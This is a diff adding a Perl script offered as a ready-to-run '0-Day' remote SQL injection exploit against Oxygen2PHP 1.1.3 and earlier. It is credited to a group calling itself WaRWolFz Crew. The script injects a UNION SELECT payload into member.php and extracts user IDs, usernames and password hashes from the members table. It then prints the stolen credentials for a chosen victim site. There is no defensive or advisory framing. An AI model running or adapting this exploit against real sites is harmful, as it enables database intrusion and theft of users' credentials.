@@ -1,0 +1,77 @@
+#!/usr/bin/perl
+#[0-Day] Oxygen2PHP <= 1.1.3 (member.php) Remote SQL Injection Exploit
+#Coded By Dante90, WaRWolFz Crew
+#Bug Discovered By: Dante90, WaRWolFz Crew
+ 
+use LWP::UserAgent;
+use HTTP::Cookies;
+use strict;
+ 
+my $UserName = shift or usage();
+ 
+my $HostName = \"http://www.victime_site.org/path/\"; #Insert Victime Web Site Link
+my $Referrer = \"http://www.warwolfz.org/\";
+ 
+sub SQL_Injection{
+    my ($Victime) = @_;
+    return \"./member.php?action=viewpro&member=-1\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,CONCAT_WS(CHAR(32,58,32),uid,username,password),14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46 FROM o2_members WHERE username=\'${Victime}\'/*\";
+}
+ 
+my $Cookies = new HTTP::Cookies;
+my $UserAgent = new LWP::UserAgent(
+            agent => \'Mozilla/5.0\',
+            max_redirect => 0,
+            cookie_jar => $Cookies,
+        ) or die $!;
+ 
+my $Get = $UserAgent->get($HostName.SQL_Injection($UserName));
+ 
+if($Get->content =~ /([0-9]{1,5}) : ([a-zA-Z0-9-_.]{2,15}) : ([a-f0-9]{32})/i){
+    refresh($HostName, $1, $2, $3);
+    print \" * Exploit Successfully Executed                      *\\n\";
+    print \" ------------------------------------------------------\\n\\n\";
+    system(\"pause\");
+}else{
+    refresh($HostName, \"\", \"\", \"\");
+    print \" * Error extracting sensible data.\\n\";
+    print \" * Exploit Failed                                     *\\n\";
+    print \" ------------------------------------------------------ \\n\\n\";
+}
+ 
+ 
+sub usage{
+    system(\"cls\");
+    {
+        print \" \\n [0-Day] Oxygen2PHP <= 1.1.3 (member.php) Remote SQL Injection Exploit\\n\";
+        print \" ------------------------------------------------------ \\n\";
+        print \" * USAGE:                                             *\\n\";
+        print \" * cd [Local Disk]:\\\\[Directory Of Exploit]\\\\           *\\n\";
+        print \" * perl name_exploit.pl [uid]                         *\\n\";
+        print \" ------------------------------------------------------ \\n\";
+        print \" *         Powered By Dante90, WaRWolFz Crew          *\\n\";
+        print \" * www.warwolfz.org - dante90_founder[at]warwolfz.org *\\n\";
+        print \" ------------------------------------------------------ \\n\";
+    };
+    exit;
+}
+ 
+sub refresh{
+    system(\"cls\");
+    {
+        print \" \\n [0-Day] Oxygen2PHP <= 1.1.3 (member.php) Remote SQL Injection Exploit\\n\";
+        print \" ------------------------------------------------------ \\n\";
+        print \" * USAGE:                                             *\\n\";
+        print \" * cd [Local Disk]:\\\\[Directory Of Exploit]\\\\           *\\n\";
+        print \" * perl name_exploit.pl [uid]                         *\\n\";
+        print \" ------------------------------------------------------ \\n\";
+        print \" *         Powered By Dante90, WaRWolFz Crew          *\\n\";
+        print \" * www.warwolfz.org - dante90_founder[at]warwolfz.org *\\n\";
+        print \" ------------------------------------------------------ \\n\";
+    };
+    print \" * Victime Site: \" . $_[0] . \"\\n\";
+    print \" * User ID: \" . $_[1] . \"\\n\";
+    print \" * Username: \" . $_[2] . \"\\n\";
+    print \" * Password: \" . $_[3] . \"\\n\";
+}
+ 
+#WaRWolFz Crew
